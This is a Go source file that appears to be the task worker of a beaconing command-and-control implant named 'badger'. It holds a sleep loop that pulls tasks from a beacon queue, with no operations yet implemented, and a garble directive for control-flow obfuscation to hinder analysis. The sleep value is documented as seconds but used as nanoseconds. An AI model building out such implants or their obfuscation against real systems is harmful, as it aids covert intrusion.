package cmd

import (
	"badger/beacon"
	"time"
)

/*
Worker struct

Status -> Active || Inactive

Sleep -> Sleep time between operations (in seconds)

Operation -> Current operation

Uptime -> Worker uptime (unix time)

kill -> Kill Worker goroutine
*/
type Worker struct {
	Status    string
	Sleep     int
	Operation string
	Uptime    int64
	kill      bool
}

/*
Start Worker goroutine
*/
//garble:controlflow flatten_passes=1 junk_jumps=2 block_splits=2
func (w *Worker) Start() {
	// Set start time
	w.Uptime = time.Now().Unix()
	// Main Worker loop
	for !w.kill {
		// Set status to inactive
		w.Status = "inactive"
		// Sleep
		time.Sleep(time.Duration(w.Sleep))
		// If Task queue is not empty, get next task
		if !beacon.TaskQueue.IsEmpty() {
			task := beacon.TaskQueue.Dequeue()
			// Switch case on Task operation
			switch task.Operation {
			default: // Invalid operation
				continue
			}
		}
	}
}
